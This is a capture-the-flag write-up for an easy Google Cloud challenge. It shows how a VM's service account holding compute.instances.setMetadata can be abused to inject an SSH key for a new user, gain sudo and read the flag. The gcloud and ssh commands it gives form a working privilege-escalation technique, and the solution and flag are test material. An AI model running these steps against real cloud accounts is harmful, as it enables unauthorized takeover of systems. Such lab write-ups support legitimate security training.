![banner](MetaRooted.assets/banner.png)



<img src="MetaRooted.assets/htb.png" style="margin-left: 20px; zoom: 40%;" align=left />        <font size="10">MetaRooted</font>

​	2<sup>nd</sup> May 2024 / Document No D24.102.66

​	Prepared By: polarbearer

​	Challenge Author(s): felamos, polarbearer

​	Difficulty: <font color=green>Easy</font>

​	Classification: Confidential													

# Synopsis

MetaRooted is an Easy cloud challenge. Players are given access to a Linux VM instance and have to identify account permissions to set metadata, and leverage this to escalate privileges on the VM instance.

# Description

You have obtained unprivileged access to a Linux machine that controls one of the many vault alarm systems. In order to deactivate the alarms and proceed with your quest, you must escalate your privileges to `root`.  You may login via SSH using the provided private key.

- IP Address: `34.132.25.162`
- Username: `vaultuser`

# Flag

`HTB{iam.root.becauseiwasgivenTooManyPrivileges}`

# Solution

We log in to the VM instance using the provided SSH key. We don't seem to be part of any interesting groups.

```bash
vaultuser@vault-instance:~$ id
uid=1002(vaultuser) gid=1003(vaultuser) groups=1003(vaultuser)
```

We can use the GCP CLI management tool `gcloud` to describe the VM instance (by default, the instance name is the same as the machine hostname).

```bash
gcloud compute instances describe vault-instance
```

Among the returned information, the non-standard service account associated with the instance looks interesting.

```yaml
<SNIP>
serviceAccounts:
- email: vault-27@ctfs-417807.iam.gserviceaccount.com
  scopes:
  - https://www.googleapis.com/auth/cloud-platform
shieldedInstanceConfig:
  enableIntegrityMonitoring: true
  enableSecureBoot: false
  enableVtpm: true
shieldedInstanceIntegrityPolicy:
  updateAutoLearnPolicy: true
startRestricted: false
status: RUNNING
tags:
  fingerprint: 42WmSpB8rSM=
zone: https://www.googleapis.com/compute/v1/projects/ctfs-417807/zones/us-central1-a
```

Let's try finding out the roles assigned to our service account `vault-27`. Unfortunately we don't have  the required permissions (`projects.get-iam-policy`) to list the IAM policy for the `ctfs-417807` project.

```bash
gcloud projects get-iam-policy ctfs-417807
```

```
ERROR: (gcloud.projects.get-iam-policy) User [vault-27@ctfs-417807.iam.gserviceaccount.com] does not have permission to access projects instance [ctfs-417807:getIamPolicy] (or it may not exist): The caller does not have permission
```

Let's check if any custom roles exist in the project.

```bash
gcloud iam roles list --project ctfs-417807
```

```yaml
etag: BwYXcLm48_M=
name: projects/ctfs-417807/roles/VaultManager
stage: GA
title: Vault Manager
```

Let's describe the attributes of the `VaultManager` role.

```
gcloud iam roles describe VaultManager --project ctfs-417807
```

```yaml
description: Role for the vault-27 service account (vault-instance VM)
etag: BwYXcxIEKDY=
includedPermissions:
- compute.instances.get
- compute.instances.setMetadata
- iam.roles.get
- iam.roles.list
name: projects/ctfs-417807/roles/VaultManager
stage: GA
title: Vault Manager
```

According to the role description, the `VaultManager` role seems to be assigned to the `vault-27` service account, which we identified earlier as the account associated to the VM instance. Among the various `list` and `get` permissions, we see a `set` permission: `compute.instances.setMetadata`. This allows writing metadata to a compute instance. Searching the web for ways to abuse this permission returns the following [article](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform) from the GitLab red team. We can follow the steps detailed in the article to add a new user with `sudo` permissions and access it via SSH key-based authentication.

```bash
NEWUSER="vaultadmin"
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt
gcloud compute instances add-metadata vault-instance --metadata-from-file ssh-keys=meta.txt
```

```bash
ssh -i ./key "$NEWUSER"@localhost
```

The new account is automatically added to the `google-sudoers` group, which allows us to escalate our privileges to `root` and read the flag in `/root/flag.txt`.

```bash
vaultadmin@vault-instance:~$ id
uid=1003(vaultadmin) gid=1004(vaultadmin) groups=1004(vaultadmin),4(adm),30(dip),44(video),46(plugdev),1000(google-sudoers)
```

```bash
sudo cat /root/flag.txt
```
